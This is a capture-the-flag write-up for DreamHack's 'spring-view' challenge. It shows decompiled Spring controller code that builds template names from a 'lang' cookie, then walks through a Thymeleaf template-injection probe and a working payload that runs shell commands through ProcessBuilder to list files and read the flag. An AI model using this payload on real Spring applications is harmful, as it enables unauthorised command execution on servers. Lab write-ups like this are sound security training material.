# spring-view — DreamHack

> **Room / Challenge:** spring-view (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** DreamHack
- **Challenge:** spring-view (web)
- **Link**: `https://dreamhack.io/wargame/challenges/99`
- **Level:** `4`
- **Date:** `28-11-2025`

---

## Goal

Decompile the `app.jar` and leveraging SSTI to get the flag.

## My Solution

Using Java Decompiler to decompile the `app.jar` we received this source code
![Guide image](./screenshots/1.png)

In `UserController.class` is where we have to examine to find the vulnerability:

```java
public class UserController {
  Logger log = LoggerFactory.getLogger(com.dreamhack.spring.UserController.class);

  @GetMapping({"/"})
  public String index(@RequestParam(value = "lang", required = false) String lang, Model model, HttpServletRequest request, HttpServletResponse response) {
    if (lang != null) {
      response.addCookie(new Cookie("lang", lang));
      return "redirect:/";
    }
    Cookie cookie_lang = WebUtils.getCookie(request, "lang");
    if (cookie_lang == null)
      response.addCookie(new Cookie("lang", "en"));
    model.addAttribute("message", "Spring World !");
    return "index";
  }

  @GetMapping({"/welcome"})
  public String welcome(@CookieValue(value = "lang", defaultValue = "en") String lang) {
    return lang + "/welcome";
  }

  @GetMapping({"/signup"})
  public String signup(@CookieValue(value = "lang", defaultValue = "en") String lang) {
    return lang + "/underconstruction";
  }

  @GetMapping({"/signin"})
  public String signin(@CookieValue(value = "lang", defaultValue = "en") String lang) {
    return lang + "/underconstruction";
  }
}
```

We can see here all three routes `/welcome`, `/signup` and `/signin` all used the cookie `lang` value to render the template, here we can think of SSTI vulnerability.

We can tried the payload `__${7*7}__::.x` and you can get `49` in response, this confirms that the app is vulnerable to SSTI:

![Guide image](./screenshots/2.png)

Now craft our payload:

```
__${new String(T(org.springframework.util.StreamUtils).copyToByteArray(new ProcessBuilder("ls","/").start().getInputStream()))}__::.x
```

Remember to URL-encoded this to prevent any errors. You will got the `flag.txt`, now use `cat flag.txt` to get the flag.

![Guide image](./screenshots/3.png)
